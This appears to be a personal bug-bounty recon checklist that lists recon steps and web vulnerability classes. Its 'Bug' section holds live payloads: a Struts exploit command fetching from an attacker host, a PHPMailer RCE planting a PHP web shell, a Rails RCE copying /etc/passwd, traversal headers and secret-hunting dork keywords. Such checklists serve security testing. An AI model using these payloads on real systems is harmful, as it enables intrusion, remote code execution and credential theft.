#					My Bug-Bounty Recon Process

### Recon Process in two part 

    1-Automation
    2-Manual
    3-After Recon: Exploit

**1- Start Automation in background, while automating time you can manually check all features of web and check every thing, Don't forget to analyse `source code`**

	1 Gather Subdomain
	2 Gather URLs,GF-Pattern
	3 Gather JS File
	4 Gather IP,Port
	5 Google/Github Dorking

### 2- Let's check mannually all vulnerability types.

<details><summary>Bug</summary>
<p>

#### We can hide anything, even code!
	- Blind XSS
		- Blind XSS payload in User-Agent header
		- BXSS Payload while logging (Enter the BXSS Payload in forgot pass, login, singup to generate errors)
		- Use BXSS Pyload as your password
	- Add Header in the Match an Replace Proxy- Add X-Forwarded-Host: evil.com - browse the program and then click burp search and try to find your X-Forwarded-Host: Value for web chache deception,poisoning.

	- HTTP Request Sumggling > Ihave give this ariticle and tool in my telegram.
	- Apply on .html to xhtml
	- python struts-pwn.py -u http://site.com/orders.xhtml -c "wget http://ip:1337/test" --exploit
	- Test For Electronic code book (AAAAAAA aaaaaa BBBBBB)
	- CVE-2016-10033: PHPMailer RCE
		- email: "attacker@127.0.0.1\" -oQ/tmp/ -X/var/www/shell.php root"127.0.0.1
		- subject: <?php system($_GET['cmd']);?>

	- Change all the request to TRACE method to disclose or access info.
	- Check For broken link - tool: blc https://comany.com -ro 

	- companyname.atlassian.net
	- jira.companyname.com
	- VHOST Testing
	- Test For buckets
	- Check Github & dork list
		(api,token,username,password,secret,dev,prod,jenkins,config,ssh,ftp,MYSQL_PASSWORD,admin,AWS,bucket,GITHUB_TOKEN)
	- gau or gauplus site.com
	- waybackurl site.com
	- Accessing misconfigured data of an org: https://storage.googleapis.com/<org-name>
	- Unautorized access to org's google groups: https://groups.google.com/a/<org-name>
	- if running ruby on rails then: Accept: ../../../../../../../../../etc/passwd{{
	- CVE-2013-0156: Rails Object injection: ruby rails_rce.rb http://site.com 'cp /etc/passwd public/file.txt'
		(raw- https://gist.github.com/postmodern/4499206/raw/a68d6ff8c1f9570a09365036aeb96f6a9fff7121/rails_rce.rb)
		(https://gist.github.com/postmodern/4499206)
	- CVE-2013-0156 Hint: PHP based website on NGINX phpip-fpizdam http://site.com/anyphpfile.php
	- Check FOr crlf injection
	- Bypass Open redirection protection
	- keyfinder
	- Google Dork
	> check email verfication admin@site.com
	> site.com/home/....4....json [will disclose all the content of the home dir | sensitive info]
	- CVE-2019-19781 Ciritix NetScaler Directory Traversal: curl -vk -path-as-is https://$target/vpn/../vpns/ 2>&1 | grep "You don't have permission to access /vpns/" >/dev/null && echo "Vulnerable $Target" || echo "MITIGATED: $TARGET"



</p>
</details>
- [ ] SQL injection
	- Use GF to grep all possible sqli parameter
	- Use SQLi [Destector](https://github.com/eslam3kl/SQLiDetector?s=09)
	- Use User-Agent fuzzer for [sqli](https://github.com/root-tanishq/userefuzz)
	- Use Error base sqli template nuclei.
- [ ] XSS

      -  Stored XSS 
      -  Reflect XSS 
      -  DOM XSS 
      -  Blind XSS 
      -  Header injection 
      -  XSS in cookie body, Local Storage
      -  Proto type pollution 
      -  HTLi
- [ ] CSRF
- [ ] IDOR
- [ ] Clickjacking
- [ ] DOM-based
- [ ] vCORS
- [ ] XXE
- [ ] SSRF

       - Try SSRF in Referer header : Shellshock Exploitation 
       - Test with match and replace in burp 
       - Read SSRF Checklist 
- [ ] Request smuggling
- [ ] Command injection
- [ ] Server-side template injection
       - [Try This Tool](https://github.com/faiyazahmad07/SSTI_DETECTOR)
       
- [ ] Insecure deserialization
- [ ] Directory traversal
- [ ] Access control
- [ ] Authentication
- [ ] OAuth authentication
- [ ] Business logic vulnerabilities
- [ ] Web cache poisoning
- [ ] HTTP Host header attacks
- [ ] WebSockets
- [ ] Information disclosure
- [ ] File upload vulnerabilities
- [ ] JWT attacks





### Subdomain Takeover: 
- *Try a tool name subzy*
- *Try this subjack*
	subjack -w subdomain.txt -t 20 -timeout 30 -o subjack1.txt -ssl -a -c "/root/fingerprints.json"
	subzy -targets host.txt --hide_fails --concurrency 100
	
- Try [DNS-Reaper](https://www.kitploit.com/2022/08/dnsreaper-subdomain-takeover-tool-for.html?m=1) 
